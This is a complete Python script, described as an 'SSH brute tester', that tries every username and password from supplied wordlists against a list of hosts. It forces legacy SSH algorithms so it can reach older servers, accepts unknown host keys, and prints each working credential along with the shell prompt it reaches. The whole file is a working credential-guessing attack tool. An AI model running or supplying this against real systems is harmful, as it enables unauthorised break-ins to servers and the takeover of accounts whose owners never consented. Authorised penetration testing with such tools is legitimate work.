import paramiko
import socket
import argparse
import sys
import signal
from itertools import product
from paramiko import SSHClient, AutoAddPolicy

# Set legacy algorithms for compatibility
paramiko.transport._preferred_kex = ['diffie-hellman-group14-sha1']
paramiko.transport._preferred_keys = ['ssh-rsa']

# Handle Ctrl+C
def signal_handler(sig, frame):
    print("\n[!] Interrupted by user. Exiting...")
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)

# Argument parser
def parse_args():
    parser = argparse.ArgumentParser(description="SSH brute tester with legacy algorithm support")
    parser.add_argument("--host", required=True, help="Path to file with host IPs")
    parser.add_argument("--user", "-u", required=True, help="Path to file with usernames")
    parser.add_argument("--pwds", "-p", dest="pwd_file", required=True, help="Path to file with passwords")
    parser.add_argument("-v", "--verbose", action="store_true", help="Enable verbose output")
    return parser.parse_args()

# Load a file into a list of stripped non-empty lines
def load_list(path):
    try:
        with open(path, "r") as f:
            return [line.strip() for line in f if line.strip()]
    except Exception as e:
        print(f"[ERROR] Failed to load file '{path}': {e}")
        sys.exit(1)

# Try SSH with given creds
def try_ssh(host, username, password, verbose=False):
    try:
        client = SSHClient()
        client.set_missing_host_key_policy(AutoAddPolicy())
        client.connect(
            hostname=host,
            username=username,
            password=password,
            allow_agent=False,
            look_for_keys=False,
            timeout=8,
            banner_timeout=8
        )

        # Invoke shell to grab real prompt
        shell = client.invoke_shell()
        output = shell.recv(1000).decode(errors='ignore').strip()

        # Display success
        print("\033[92m[+] Success:\033[0m", f"{username}@{host}:{password}", end="")
        if verbose:
            print(f"  --> Prompt: {output.splitlines()[-1]}")
        else:
            print()

        client.close()
        return True

    except paramiko.AuthenticationException as e:
        if verbose:
            print(f"[-] Auth failed: {username}@{host}:{password} ({e})")
    except paramiko.SSHException as e:
        emsg = str(e)
        if verbose:
            if 'kex' in emsg.lower() or 'host key' in emsg.lower():
                print(f"[!] SSH negotiation failed on {host} (likely missing KEX or host key algorithm): {emsg}")
            else:
                print(f"[!] SSH error on {host}: {emsg}")
    except socket.timeout:
        if verbose:
            print(f"[!] Timeout on {host}")
    except socket.error as e:
        if verbose:
            print(f"[!] Socket error on {host}: {e}")
    except Exception as e:
        if verbose:
            print(f"[!] General error on {host}: {e}")
    return False

# Main logic
def main():
    args = parse_args()
    hosts = load_list(args.host)
    users = load_list(args.user)
    pwds = load_list(args.pwd_file)

    if not hosts or not users or not pwds:
        print("[ERROR] One or more input files are empty. Please check them.")
        sys.exit(1)

    print(f"[INFO] Loaded {len(hosts)} hosts, {len(users)} users, {len(pwds)} passwords")

    for host in hosts:
        for username, password in product(users, pwds):
            try_ssh(host, username, password, verbose=args.verbose)

# Entry point
if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        print(f"[ERROR] Unexpected error: {e}")
        sys.exit(1)
